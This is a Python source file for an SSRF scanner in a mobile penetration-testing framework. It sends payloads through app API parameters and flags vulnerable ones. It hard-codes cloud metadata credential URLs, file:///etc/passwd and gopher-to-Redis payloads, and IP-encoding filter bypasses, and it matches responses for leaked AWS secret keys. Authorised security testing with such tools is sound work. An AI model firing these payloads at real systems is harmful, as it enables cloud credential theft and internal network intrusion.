"""
Jarwis AGI Pen Test - Mobile SSRF (Server-Side Request Forgery) Scanner

Detects SSRF vulnerabilities in mobile app API traffic.
Extends BaseMobileScanner for MITM-first methodology.

OWASP Mobile Top 10 2024: M4 - Insufficient Input/Output Validation
CWE-918: Server-Side Request Forgery (SSRF)

Mobile-specific considerations:
- Mobile apps often have URL preview, webhook, import features
- Many mobile backends fetch remote resources (images, documents)
- OAuth callback URLs are SSRF targets
- AWS/GCP/Azure metadata endpoints are high-value targets
"""

import asyncio
import logging
import re
import uuid
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse

from attacks.mobile.base_mobile_scanner import (
    BaseMobileScanner,
    MobileFinding,
    Severity,
    Confidence
)
from core.mobile_http_client import MobileHTTPClient, MobileAttackResponse
from core.mobile_request_store import MobileRequestStoreDB, StoredMobileRequest

logger = logging.getLogger(__name__)


class MobileSSRFScanner(BaseMobileScanner):
    """
    Server-Side Request Forgery Scanner for Mobile APIs
    
    Scans mobile app traffic for SSRF vulnerabilities.
    Uses MITM-captured requests to test URL parameters.
    
    Attack vectors:
    - Internal network access
    - Cloud metadata endpoints (AWS/GCP/Azure)
    - Local services (Redis, Memcached, internal APIs)
    - Protocol smuggling (file://, gopher://)
    - DNS rebinding
    """
    
    # Scanner identification
    scanner_name = "mobile_ssrf"
    attack_type = "ssrf"
    vuln_type = "ssrf"
    owasp_category = "M4"  # Insufficient Input/Output Validation
    cwe_id = "CWE-918"
    
    # Cloud metadata endpoints
    CLOUD_METADATA = {
        'aws': 'http://169.254.169.254/latest/meta-data/',
        'aws_token': 'http://169.254.169.254/latest/api/token',
        'aws_creds': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'gcp': 'http://metadata.google.internal/computeMetadata/v1/',
        'azure': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'digitalocean': 'http://169.254.169.254/metadata/v1/',
        'alibaba': 'http://100.100.100.200/latest/meta-data/',
    }
    
    # Internal network targets
    INTERNAL_TARGETS = [
        'http://127.0.0.1/',
        'http://localhost/',
        'http://127.0.0.1:80/',
        'http://127.0.0.1:8080/',
        'http://127.0.0.1:3000/',
        'http://127.0.0.1:8000/',
        'http://0.0.0.0/',
        'http://[::1]/',
        'http://0/',
        'http://127.1/',
        # Common internal services
        'http://127.0.0.1:6379/',  # Redis
        'http://127.0.0.1:11211/',  # Memcached
        'http://127.0.0.1:9200/',  # Elasticsearch
        'http://127.0.0.1:5432/',  # PostgreSQL
        'http://127.0.0.1:27017/',  # MongoDB
    ]
    
    # Bypass techniques
    BYPASS_PAYLOADS = [
        # Decimal IP
        'http://2130706433/',  # 127.0.0.1 in decimal
        # Octal IP
        'http://0177.0.0.1/',
        # Hex IP
        'http://0x7f.0x0.0x0.0x1/',
        # Mixed encoding
        'http://127.0.0.1%00.evil.com/',
        # URL encoding
        'http://%31%32%37%2e%30%2e%30%2e%31/',
        # Double URL encoding
        'http://%25%33%31%25%33%32%25%33%37%2e%30%2e%30%2e%31/',
        # IPv6 wrapped
        'http://[::ffff:127.0.0.1]/',
        # Short notation
        'http://127.1/',
        'http://0/',
        # Redirect bypass
        'http://localtest.me/',  # Points to 127.0.0.1
        'http://spoofed.burpcollaborator.net/',
    ]
    
    # Protocol payloads
    PROTOCOL_PAYLOADS = [
        'file:///etc/passwd',
        'file:///C:/Windows/win.ini',
        'dict://127.0.0.1:11211/stat',
        'gopher://127.0.0.1:6379/_INFO',
    ]
    
    # AWS metadata patterns
    AWS_PATTERNS = [
        r'ami-[a-z0-9]+',  # AMI ID
        r'i-[a-z0-9]+',  # Instance ID
        r'AccessKeyId',
        r'SecretAccessKey',
        r'Token',
        r'iam/security-credentials',
        r'instance-id',
        r'local-hostname',
        r'local-ipv4',
    ]
    
    # Internal network response patterns
    INTERNAL_PATTERNS = [
        r'root:.*:0:0:',  # /etc/passwd
        r'Redis',
        r'STAT',
        r'Memcached',
        r'Elasticsearch',
        r'MongoDB',
        r'Welcome to nginx',
        r'Apache',
        r'localhost',
        r'127\.0\.0\.1',
        r'Connection refused',  # Error also indicates SSRF
    ]
    
    # High-priority parameters for SSRF
    PRIORITY_PARAMS = [
        'url', 'uri', 'link', 'href', 'src', 'source', 'target',
        'dest', 'destination', 'redirect', 'return', 'callback',
        'webhook', 'endpoint', 'api', 'host', 'domain', 'address',
        'site', 'page', 'image', 'img', 'picture', 'photo', 'avatar',
        'file', 'path', 'fetch', 'load', 'import', 'export', 'proxy',
        'feed', 'rss', 'xml', 'preview', 'pdf', 'doc', 'document'
    ]
    
    def __init__(
        self,
        http_client: MobileHTTPClient,
        request_store: MobileRequestStoreDB,
        oob_server=None,
        test_cloud_metadata: bool = True,
        **kwargs
    ):
        """
        Initialize Mobile SSRF Scanner.
        
        Args:
            http_client: Mobile HTTP client for attacks
            request_store: Mobile request store
            oob_server: Optional OOB callback server for blind SSRF
            test_cloud_metadata: Whether to test cloud metadata endpoints
        """
        super().__init__(http_client, request_store, **kwargs)
        self.oob_server = oob_server
        self.test_cloud_metadata = test_cloud_metadata
        self.token = uuid.uuid4().hex[:8]
    
    def get_payloads(self) -> List[str]:
        """Return SSRF detection payloads."""
        payloads = list(self.CLOUD_METADATA.values())
        payloads.extend(self.INTERNAL_TARGETS[:5])
        return payloads[:self.max_payloads_per_param]
    
    def is_applicable(self, request: StoredMobileRequest) -> bool:
        """Check if request has URL-like parameters."""
        # Must have parameters
        if not request.parameters and not request.body:
            return False
        
        # Get all parameter names and values
        all_params = dict(request.parameters)
        if request.body:
            try:
                import json
                body_data = json.loads(request.body)
                if isinstance(body_data, dict):
                    all_params.update(body_data)
            except:
                pass
        
        # Check for URL-like parameter names
        for name in all_params.keys():
            if any(prio in name.lower() for prio in self.PRIORITY_PARAMS):
                return True
        
        # Check for URL-like values
        for value in all_params.values():
            if isinstance(value, str):
                if value.startswith(('http://', 'https://', '//')):
                    return True
                # Check if looks like a URL
                try:
                    parsed = urlparse(value)
                    if parsed.scheme and parsed.netloc:
                        return True
                except:
                    pass
        
        return False
    
    async def scan_request(self, request: StoredMobileRequest) -> List[MobileFinding]:
        """
        Scan a request for SSRF vulnerabilities.
        
        Flow:
        1. Identify URL parameters
        2. Test cloud metadata endpoints
        3. Test internal network access
        4. Test bypass techniques
        5. Test protocol smuggling
        """
        findings = []
        
        # Get baseline response
        baseline = await self.get_baseline(request)
        if not baseline:
            logger.warning(f"[{self.scanner_name}] No baseline for {request.url}")
            return findings
        
        # Find URL parameters
        url_params = self._find_url_params(request)
        
        for param_name, param_location in url_params:
            if self._cancelled:
                break
            
            # 1. Test cloud metadata endpoints
            if self.test_cloud_metadata:
                cloud_finding = await self._test_cloud_metadata(
                    request, param_name, param_location, baseline
                )
                if cloud_finding:
                    findings.append(cloud_finding)
                    continue
            
            # 2. Test internal network access
            internal_finding = await self._test_internal_access(
                request, param_name, param_location, baseline
            )
            if internal_finding:
                findings.append(internal_finding)
                continue
            
            # 3. Test bypass techniques
            bypass_finding = await self._test_bypasses(
                request, param_name, param_location, baseline
            )
            if bypass_finding:
                findings.append(bypass_finding)
        
        return findings
    
    def _find_url_params(self, request: StoredMobileRequest) -> List[tuple]:
        """Find parameters that might accept URLs."""
        url_params = []
        
        # Check query parameters
        for name, value in request.parameters.items():
            if any(prio in name.lower() for prio in self.PRIORITY_PARAMS):
                url_params.append((name, 'query'))
            elif isinstance(value, str) and value.startswith(('http://', 'https://')):
                url_params.append((name, 'query'))
        
        # Check JSON body
        if request.body:
            try:
                import json
                body_data = json.loads(request.body)
                if isinstance(body_data, dict):
                    for name, value in body_data.items():
                        if any(prio in name.lower() for prio in self.PRIORITY_PARAMS):
                            url_params.append((name, 'body'))
                        elif isinstance(value, str) and value.startswith(('http://', 'https://')):
                            url_params.append((name, 'body'))
            except:
                pass
        
        return url_params
    
    async def _test_cloud_metadata(
        self,
        request: StoredMobileRequest,
        param_name: str,
        location: str,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test for cloud metadata endpoint access."""
        for cloud_name, metadata_url in self.CLOUD_METADATA.items():
            response = await self.send_payload(
                request,
                metadata_url,
                location=location,
                param_name=param_name
            )
            
            if not response:
                continue
            
            response_text = response.body if isinstance(response.body, str) else str(response.body)
            
            # Check for AWS metadata patterns
            for pattern in self.AWS_PATTERNS:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=metadata_url,
                        title=f"SSRF to Cloud Metadata ({cloud_name.upper()})",
                        description=(
                            f"The parameter '{param_name}' is vulnerable to SSRF allowing access "
                            f"to cloud metadata endpoint. The payload '{metadata_url}' retrieved "
                            f"cloud instance metadata. This can lead to credential theft and "
                            "full cloud account compromise."
                        ),
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH
                    )
        
        return None
    
    async def _test_internal_access(
        self,
        request: StoredMobileRequest,
        param_name: str,
        location: str,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test for internal network access via SSRF."""
        for internal_url in self.INTERNAL_TARGETS[:7]:  # Limit for performance
            response = await self.send_payload(
                request,
                internal_url,
                location=location,
                param_name=param_name
            )
            
            if not response:
                continue
            
            response_text = response.body if isinstance(response.body, str) else str(response.body)
            baseline_text = baseline.body if isinstance(baseline.body, str) else str(baseline.body)
            
            # Check for internal content
            for pattern in self.INTERNAL_PATTERNS:
                if re.search(pattern, response_text, re.IGNORECASE):
                    # Verify not in baseline
                    if not re.search(pattern, baseline_text, re.IGNORECASE):
                        return self.create_finding(
                            request=request,
                            response=response,
                            payload=internal_url,
                            title=f"SSRF to Internal Network",
                            description=(
                                f"The parameter '{param_name}' is vulnerable to SSRF allowing "
                                f"access to internal network resources. The payload '{internal_url}' "
                                "accessed an internal service. This can be used for port scanning, "
                                "accessing internal APIs, and pivoting attacks."
                            ),
                            severity=Severity.HIGH,
                            confidence=Confidence.HIGH
                        )
            
            # Check for response differences indicating access
            if response.status_code != baseline.status_code:
                if response.status_code in [200, 301, 302, 403]:
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=internal_url,
                        title=f"Possible SSRF (Internal Access)",
                        description=(
                            f"The parameter '{param_name}' shows signs of SSRF. "
                            f"The payload '{internal_url}' caused a different response "
                            f"(status {response.status_code} vs baseline {baseline.status_code})."
                        ),
                        severity=Severity.MEDIUM,
                        confidence=Confidence.MEDIUM
                    )
        
        return None
    
    async def _test_bypasses(
        self,
        request: StoredMobileRequest,
        param_name: str,
        location: str,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test SSRF bypass techniques."""
        for bypass_url in self.BYPASS_PAYLOADS[:5]:  # Limit for performance
            response = await self.send_payload(
                request,
                bypass_url,
                location=location,
                param_name=param_name
            )
            
            if not response:
                continue
            
            response_text = response.body if isinstance(response.body, str) else str(response.body)
            
            # Check for internal content patterns
            for pattern in self.INTERNAL_PATTERNS:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=bypass_url,
                        title=f"SSRF via Bypass Technique",
                        description=(
                            f"The parameter '{param_name}' is vulnerable to SSRF using "
                            f"filter bypass technique. The payload '{bypass_url}' successfully "
                            "accessed internal resources by bypassing URL validation."
                        ),
                        severity=Severity.HIGH,
                        confidence=Confidence.HIGH
                    )
        
        return None
